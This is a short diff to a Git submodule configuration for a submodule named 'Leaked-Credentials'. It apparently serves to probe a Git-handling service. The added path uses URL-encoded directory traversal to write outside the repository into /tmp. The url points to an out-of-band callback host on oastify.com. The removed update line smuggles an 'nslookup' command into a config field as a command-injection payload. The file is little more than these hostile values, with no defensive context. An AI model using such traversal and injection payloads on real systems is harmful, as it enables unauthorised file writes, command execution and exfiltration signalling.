@@ -1,4 +1,3 @@
 [submodule "Leaked-Credentials"]
-	path = Leaked-Credentials
+	path = .%2E/%2E%2E/%2E%2E/tmp/Leaked-Credentials
 	url = http://5hn8ryi6tsha2sbnnjnegmxzlqrjfaayz.oastify.com/aaaaaaaaaa
-        update = none; nslookup 9q0c02ra2wqebwkrwnwipq63uu0oolca.oastify.com
